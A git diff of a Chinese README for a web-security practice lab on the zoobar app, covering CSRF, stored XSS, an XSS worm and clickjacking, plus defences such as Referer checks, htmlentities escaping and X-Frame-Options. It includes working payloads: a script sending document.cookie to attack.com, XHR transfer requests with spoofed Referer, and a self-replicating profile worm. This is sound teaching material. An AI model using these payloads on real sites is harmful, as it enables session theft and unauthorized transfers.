@@ -1,7 +1,5 @@
 # web 安全实践练习项目
 
-
-
 web 安全实践实验项目，对其做了一些修改。
 
 **修改内容**
@@ -10,6 +8,12 @@ web 安全实践实验项目，对其做了一些修改。
 * 对部分类、变量以及html标签的命名做了一些调整。
 * 修改部分代码格式；
 * 对部分安全性内容进行修改；
+
+> **注**：因为后来对文档做了修改，可能造成与截图的不一致。
+
+---
+
+
 
 ## 配置与运行
 
@@ -25,7 +29,7 @@ web 安全实践实验项目，对其做了一些修改。
 
 其他mysql选项被定义在php.ini中的 `MySQLi` section中，可自行修改：
 
-![image-20211226180342034](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226180342034.png)
+![image-20211226180342034](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553516.png)
 
 #### httpd/apache服务器配置
 
@@ -163,7 +167,7 @@ $ENABLE_TOKEN_CHECK = true;
 
 * `cooker.php`：接受请求并打印cookie（实际上没用，要获取cookie，只需要查看 attack.com 的访问日志就可以）：
 
-  ![image-20211221210534047](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211221210534047.png)
+  ![image-20211221210534047](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553366.png)
 
 * `xssworm.html`：用于存储至zoobar用户的profile中，解析为js后，自动提交转交请求，并提交一个将用户profile 更新为本脚本内容的请求。
 
@@ -187,39 +191,52 @@ $ENABLE_TOKEN_CHECK = true;
 hacker 在自己的profile中设置：
 
 ```html
-<a href="http://nissattack.com/csrf.html">click me to win iphone</a>          
+<a href="http://attack.com/csrf.html">click me to win iphone</a>          
 ```
 
 浏览器将其解析为html链接：
 
-![image-20211226182515431](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226182515431.png)
+![image-20211226182515431](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553412.png)
 
-普通用户点击进入`nissattack/csrf.html`，js会自动提交一个zoobar转移表单。
+普通用户点击进入 `attack/csrf.html`，js会自动提交一个zoobar转移表单。
 
 理论上可以通过以下代码自动发送一个转帐请求：
 
 ```js
 const req = new XMLHttpRequest();
 req.withCredentials = true;
-req.open("POST","https://baidu.com",false);
+req.open("POST","https://zoobar.com",false);
 req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 req.send("zoobars=1&recipient=hacker&submission=Send");
 alert("YOU WIN");
 ```
 
-> **注意**：设置 `Content-type` 标头：`application/x-www-form-urlencoded` 与 `mutipart/form-data` 皆可。（不会还有人不知道两者的区别吧😅）
+> **注意**：设置 `Content-type` 标头：`application/x-www-form-urlencoded` 与 `multipart/form-data` 皆可。（不会还有人不知道两者的区别吧😅）
 
 因为同源策略，httpd服务器会禁止该请求：
 
-![image-20211226182846492](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226182846492.png)
+![image-20211226182846492](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553392.png)
+
+浏览器会提示 `attack.com` 的 `Access-Control-Allow-Origin` 标头缺失，不允许读取 `zoobar.com` 的资源。
+
+也就是说要访问的网站需要在响应头部加上 `Access-Control-Allow-Origin` 标头，来告知浏览器是否可以加载 `zoobar.com` 的资源。
+
+可以通过 `*` 来进行模糊匹配，例如下面的标头，都可以通知浏览器允许在 `zoobar` 域下发起对 `attack` 的请求 ：
+
+* `Access-Control-Allow-Origin:http://zoobar.com`
+* `Access-Control-Allow-Origin:*`
+
+当完成这些工作时，理论上应该可以通过纯js发起请求了。（没试过）
 
 [浏览器的同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
 
-所以需要通过提交表单的方式完成本次攻击：
+[CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
+
+可以通过提交表单的方式完成本次攻击：
 
 ```bash
 <form method="POST"
-      action="https://niss.com/transfer.php"
+      action="https://zoobar.com/transfer.php"
       target="it"
       id="transfer-form">
 
@@ -246,7 +263,7 @@ alert("YOU WIN");
 从日志中可以看出，所有的transfer来源为：`transfer.php`：
 
 ```
-127.0.0.1 - - [26/Dec/2021:18:40:53 +0800] "POST /transfer.php HTTP/1.1" 200 1874 "https://niss.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
+127.0.0.1 - - [26/Dec/2021:18:40:53 +0800] "POST /transfer.php HTTP/1.1" 200 1874 "https://zoobar.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
 ```
 
 php可以使用http_referer获取请求来源页面，判定是否为 `/transfer.php`，如果不是则停止服务。
@@ -257,7 +274,7 @@ php可以使用http_referer获取请求来源页面，判定是否为 `/transfer
 
 ```php
 function checkHttpReferer(){
-    $request_from = "https://niss.com/transfer.php";
+    $request_from = "https://zoobar.com/transfer.php";
     $fromPage = $_SERVER['HTTP_REFERER'];
     if($fromPage == $request_from ){
         return;
@@ -273,10 +290,10 @@ function checkHttpReferer(){
 
 ![image-20211226184959116](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226184959116.png)
 
-从日志记录可以看出，php将其认为其来源为`https://niss.com/transfer.php`：
+从日志记录可以看出，php将其认为其来源为`https://zoobar.com/transfer.php`：
 
 ```bash
-127.0.0.1 - - [26/Dec/2021:18:51:16 +0800] "POST /transfer.php HTTP/1.1" 200 1866 "https://niss.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
+127.0.0.1 - - [26/Dec/2021:18:51:16 +0800] "POST /transfer.php HTTP/1.1" 200 1866 "https://zoobar.com/transfer.php" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
 ```
 
 通过结果来看攻击也确实成功了。
@@ -287,9 +304,9 @@ function checkHttpReferer(){
 <script type="text/javascript">
     const req = new XMLHttpRequest();
     req.withCredentials = true;
-    req.open("POST","https://niss.com/transfer.php",false);
+    req.open("POST","https://zoobar.com/transfer.php",false);
 	// 修改 Referer
-    req.setRequestHeader("Referer","https://niss.com/transfer.php")
+    req.setRequestHeader("Referer","https://zoobar.com/transfer.php")
     req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     req.send("zoobars=1&recipient=hacker&submission=Send");
     alert("YOU WIN");
@@ -322,13 +339,13 @@ xsser将以下代码存储在profile中：
 <h1>HEllO-+___++___+</h1>
 
 <script>
-  window.open("http://nissattack.com/cooker.php?cookie="+document.cookie)
+  window.open("http://attack.com/cooker.php?cookie="+document.cookie)
 </script>
 ```
 
 普通用户点击后自动发送一个包含本页面cookie的请求至攻击者页面。
 
-在nissattack.com网站的日志记录中可以看到,cookie被窃取：
+在attack.com网站的日志记录中可以看到,cookie被窃取：
 
 ```bash
 127.0.0.1 - - [26/Dec/2021:20:16:16 +0800] "GET /cooker.php?cookie=PHPSESSID=t4bjul4eclvpib482fu3vitg7h;%20ZoobarLogin=YToyOntpOjA7czo1OiJ4c3NlciI7aToxO3M6MzI6ImQ5MDZhYzcwY2M0NmQ5MGZmODUzNjg3NDg1NDg5NDJjIjt9 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
@@ -346,15 +363,15 @@ xsser将以下代码存储在profile中：
 <span id="xssworm-span">
     <script>
         xmlhttp=new XMLHttpRequest();
-        xmlhttp.open("POST","https://niss.com/transfer.php",false);
-        req.setRequestHeader("Referer","https://niss.com/transfer.php")
+        xmlhttp.open("POST","https://zoobar.com/transfer.php",false);
+        req.setRequestHeader("Referer","https://zoobar.com/transfer.php")
         xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         // 提交请求，为 xsswormer 转一个zoobar
         xmlhttp.send("zoobars=1&recipient=xsswormer&submission=Send");
 
         // 提交profile更新请求
         xmlhttp=new XMLHttpRequest();
-        xmlhttp.open("POST","https://niss.com/index.php",true);
+        xmlhttp.open("POST","https://zoobar.com/index.php",true);
         xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
         // 读取本块元素内容 ==> str
         str = "<span id=xssworm-span>"
@@ -404,13 +421,15 @@ $profile = preg_replace("/>/i", "&gt", $profile);
 
 其实php中提供了该功能函数 `htmlentities($string)`，该函数将特殊字符转义为实体字符，从而并不会被浏览器解析为tag 。
 
-![image-20211226200748929](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/image-20211226200748929.png)
+![image-20211226200748929](https://ni187note-pics.oss-cn-hangzhou.aliyuncs.com/notes-img/202204011553445.png)
 
 > **注**：字符转移总是应该在输出时进行。
 
 具体代码改动看：`users.php`
 
 ##### 黑\白名单
+
+用正则表达式匹配，不允许/只允许
 
 ### 点击劫持
 
@@ -421,7 +440,7 @@ $profile = preg_replace("/>/i", "&gt", $profile);
 hijacker在自己的profile中添加：
 
 ```html
-<a href="http://nissattack.com/hijack.html">win</a>    
+<a href="http://attack.com/hijack.html">win</a>    
 ```
 
 用户点击进入后会看到（为了方便演示，此时的透明度为50%）：
@@ -436,7 +455,7 @@ hijacker在自己的profile中添加：
 
 ##### X-Frame-Options
 
-The **`X-Frame-Options`** HTTP 响应头是用来给浏览器 指示允许一个页面可否在`<frame>`，`<iframe>` ，`<embed>`，`<object>`，中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 clickjacking 攻击。
+The **`X-Frame-Options`** HTTP 响应头是用来给浏览器指示允许一个页面可否在 `<frame>`，`<iframe>` ，`<embed>`，`<object>`，中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免 clickhjacking 攻击。
 
 `X-Frame-Options` 有三个可能的值：
 
@@ -458,7 +477,7 @@ X-Frame-Options: allow-from https://example.com/
 LoadModule headers_module modules/mod_headers.so
 ```
 
-开启X-Frame-Options，在自定义配置文件中添加：
+在自定义配置文件中添加，来让httpd服务器发起的响应中，总是添加该头部：
 
 ```htaccess
 <IfModule headers_module>
